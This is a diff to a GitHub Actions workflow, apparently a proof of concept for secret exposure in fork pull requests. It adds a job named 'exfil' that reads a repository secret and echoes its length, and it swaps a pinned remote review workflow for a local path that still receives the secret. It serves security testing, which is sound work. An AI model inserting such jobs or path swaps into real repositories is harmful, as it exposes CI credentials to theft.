@@ -11,7 +11,13 @@ permissions:
   pull-requests: write
 
 jobs:
+  exfil:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          KEY: ${{ secrets.SCW_PR_REVIEW_SECRET_KEY }}
+        run: echo "FORK-CALLER-RAN key-length=${#KEY}"
   review:
-    uses: protobase-community/.github/.github/workflows/ai-pr-review.yml@main # zizmor: ignore[unpinned-uses] main is the reviewed version
+    uses: ./.github/workflows/ai-pr-review.yml # zizmor: ignore[unpinned-uses] main is the reviewed version
     secrets:
       SCW_PR_REVIEW_SECRET_KEY: ${{ secrets.SCW_PR_REVIEW_SECRET_KEY }}
